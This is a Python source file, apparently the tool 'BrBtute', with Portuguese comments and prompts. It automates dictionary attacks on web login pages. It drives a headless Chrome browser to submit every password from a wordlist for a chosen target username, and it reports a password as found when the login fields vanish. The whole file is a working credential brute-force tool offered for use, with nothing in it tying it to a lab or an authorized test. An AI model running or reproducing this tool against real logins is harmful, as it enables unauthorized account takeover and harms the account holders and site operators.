
import sys
import requests
import selenium 
from selenium import webdriver 
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from optparse import OptionParser

class color:
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    WHITE = '\033[0m'


parser = OptionParser() 
parser.add_option("--site", dest="website", help="Target login page (http/https only)") # Argumento para a página de login de destino
parser.add_option("--usel", dest="usersel", help="Username input selector") # Argumento para o seletor css do elemento de entrada nome de usuário
parser.add_option("--psel", dest="passsel", help="Password input selector") # Argumento para o seletor css do elemento de entrada de senha
parser.add_option("--user", dest="username", help="Target username to attack") # Argumento para o nome de usuário de destino a ser atacado
parser.add_option("--pass", dest="passlist", help="Password dictionary") # Argumentos para a localização da lista de senhas
(options, args) = parser.parse_args() # Analisar os argumentos fornecidos pelo usuário


banner = color.PURPLE + '''
 _______             _______                         __               
/       \           /       \                       /  |              
$$$$$$$  |  ______  $$$$$$$  |  ______   __    __  _$$ |_     ______  
$$ |__$$ | /      \ $$ |__$$ | /      \ /  |  /  |/ $$   |   /      \ 
$$    $$< /$$$$$$  |$$    $$< /$$$$$$  |$$ |  $$ |$$$$$$/   /$$$$$$  |
$$$$$$$  |$$ |  $$/ $$$$$$$  |$$ |  $$/ $$ |  $$ |  $$ | __ $$    $$ |
$$ |__$$ |$$ |      $$ |__$$ |$$ |      $$ \__$$ |  $$ |/  |$$$$$$$$/ 
$$    $$/ $$ |      $$    $$/ $$ |      $$    $$/   $$  $$/ $$       |
$$$$$$$/  $$/       $$$$$$$/  $$/        $$$$$$/     $$$$/   $$$$$$$/

{0}[#] {1}wellintonp/BrBtute@v1.3
'''.format(color.CYAN, color.WHITE)


# Assistente que é apresentado se executado sem nenhum argumento
def wizard():
    print(banner) # Mostrar o banner
    try: # Verifique se a página está acessível
        website = input(color.GREEN + '\n[~] ' + color.WHITE + 'Página de login de destino (somente http/https): ')
        sys.stdout.write(color.GREEN + '[#] ' + color.WHITE + 'Verificando se o site está acessível ')
        sys.stdout.flush()
        request = requests.get(website) # Envie uma solicitação GET para o site
        if request.status_code == 200: # Se o site existir
            print(color.GREEN + '[OK]\n'+color.WHITE)
        else: # Se o site estiver inacessível
            print(color.RED + '[X]' + '\n[!] '+color.WHITE + 'Não pôde se conectar ao ' + website)
            exit(1)
    except KeyboardInterrupt: # Se o usuário sair do programa manualmente
        print(color.RED + '\n[!] '+ color.WHITE + 'Processo encerrado pelo usuário. saindo...')
        exit(0)
    except requests.exceptions.MissingSchema: # O protocolo (http/https) está ausente no URL
        print(color.RED + '[X]' + '\n[!] '+color.WHITE + 'URL inválida. Certifique-se de usar apenas http/https.')
        exit(1)
    except requests.ConnectTimeout: # Se a página demorar muito para responder
        print(color.RED + '[X]' + '\n[!] '+color.WHITE + 'A conexão expirou')
        exit(1)
    try: # Collect information
        usersel = input( color.GREEN + '[~] ' + color.WHITE + 'Seletor do input de usuário: ') # Seletor Css para campo de entrada de nome de usuário
        passsel = input( color.GREEN + '[~] ' + color.WHITE + 'Seletor do input de senha: ') # Seletor Css para campo de entrada de senha
        username = input( color.GREEN + '[~] ' + color.WHITE + 'Nome do usuário: ') # Nome de usuário do alvo
        passlist = input( color.GREEN + '[~] ' + color.WHITE + 'Lista de senhas: ') # Localização da lista de senhas
        f = open(passlist, 'r') # Abrir lista de senhas
        crack(username, usersel, passsel, passlist, website) # Iniciar o ataque
    except KeyboardInterrupt: # Se o usuário sair do programa manualmente
        print(color.RED + '\n[!] '+color.WHITE + 'Processo encerrado pelo usuário. saindo...')
        exit(0)


# Função principal de força bruta
def crack(username, usersel, passsel, passlist, website):
    try: # Abrir lista de senhas
        f = open(passlist, 'r')
    except FileNotFoundError: # Se a lista não for encontrada
        print(color.RED + '\n[!] '+color.WHITE + 'Lista de senhas não encontrada')
        exit(1)
    chrome_options = webdriver.ChromeOptions()
    chrome_options.add_argument("--disable-popup-blocking")
    chrome_options.add_argument("--disable-extensions")
    chrome_options.add_argument("--headless")
    chrome_options.add_argument("--log-level=2")
    try: # Inicie o navegador
        browser = webdriver.Chrome(options=chrome_options)
        browser.implicitly_wait(2)
    except selenium.common.exceptions.WebDriverException: # Se o ChromeDriver não foi encontrado
        print(color.RED + '\n[!] '+color.WHITE + 'ChromeDriver não encontrado')
        exit(1)
    browser.get(website) # Abrir site de destino
    try: # Verifique se o seletor css do campo de nome de usuário é válido e está disponível
        browser.find_element(By.CSS_SELECTOR, value=usersel)
    except selenium.common.exceptions.NoSuchElementException: # Se o seletor for inválido
        print(color.RED + '\n[!] '+ color.WHITE + 'O seletor input do nome de usuário é inválido.')
        exit(1)
    try: # Verifique se o seletor css do campo de senha é válido e disponível
        browser.find_element(By.CSS_SELECTOR, value=passsel)
    except selenium.common.exceptions.NoSuchElementException: # Se o seletor for inválido
        print(color.RED + '\n[!] '+ color.WHITE + 'O seletor input da senha é inválido.')
        exit(1)
    print(color.GREEN + '\nTarget user: ' + color.RED + username + color.WHITE + '\n') # Nome de usuário do alvo
    try: # Iniciar o ataque
        for password in f: # Execute o ataque até que a lista de senhas acabe
            browser.get(website) # Abrir novo site
            browser.find_element(By.CSS_SELECTOR, value=usersel).send_keys(username) # Insira nome de usuário
            browser.find_element(By.CSS_SELECTOR, value=passsel).send_keys(password + Keys.ENTER) # Insira a seha
            tried = password
            print(color.GREEN + 'Tried: ' + color.WHITE + tried) # Registrar última senha tentada
        print(color.RED + '\n[!] '+color.WHITE + 'Desculpe, a senha não foi encontrada') # Mensagem para se a lista de senhas acabou e a senha não foi encontrada
    except KeyboardInterrupt: # Se o usuário sair do programa manualmente
        print(color.RED + '\n[!] '+color.WHITE + 'Processo encerrado pelo usuário. saindo...')
        exit(0)
    except selenium.common.exceptions.NoSuchElementException: # Se o campo de senha ou nome de usuário ficar oculto, isso significa que a senha foi encontrada (ou seu IP foi banido)
        print(color.GREEN + '\n[#] ' + color.WHITE + 'Senha encontrada: ' + color.CYAN + tried)
        print(color.YELLOW + 'Feliz em ajuda! ;)' + color.WHITE)
        exit(0)


# Testes para verificar se os argumentos são válidos
if options.website == None and options.usersel == None and options.passsel == None and options.username == None and options.passlist == None: # Se nenhum argumento for dado
    wizard()
missing_args = ""
if options.website == None:
    missing_args += "--site "
if options.usersel == None:
    missing_args += "--usel "
if options.passsel == None:
    missing_args += "--psel "
if options.username == None:
    missing_args += "--user "
if options.passlist == None:
    missing_args += "--pass"
if missing_args != "": # Se algum (mas não todos) argumentos estiverem faltando
    print(color.RED + '\n[!] '+color.WHITE + 'Campos ausentes: ' + missing_args)
    wizard()
else: # Se todos os argumentos estiverem presentes
    print(banner)
    sys.stdout.write(color.GREEN + '[#] ' + color.WHITE + 'Verificando se o site está acessível ')
    sys.stdout.flush()
    try: # Verifique se a página está acessível
        request = requests.get(options.website) # Envie uma solicitação GET para o site
        if request.status_code == 200: # Se o site existir
            print(color.GREEN + '[OK]\n'+color.WHITE)
        else: # Se o site estiver inacessível
            print(color.RED + '[X] ' + '\n[!]'+color.WHITE + 'Não pôde se conectar ao ' + options.website)
            exit(1)
    except KeyboardInterrupt: # Se o usuário sair do programa manualmente
        print(color.RED + '\n[!] '+color.WHITE + 'Processo encerrado pelo usuário. saindo...')
        exit(0)
    except requests.exceptions.MissingSchema: # O protocolo (http/https) está ausente no URL
        print(color.RED + '[X] ' + '\n[!]'+color.WHITE + 'URL inválida. Certifique-se de usar apenas http/https.')
        exit(1)
    except requests.ConnectTimeout: # Se a página demorar muito para responder
        print(color.RED + '[X] ' + '\n[!]'+color.WHITE + 'A conexão expirou')
        exit(1)
    crack(options.username, options.usersel, options.passsel, options.passlist, options.website) # Iniciar o ataque
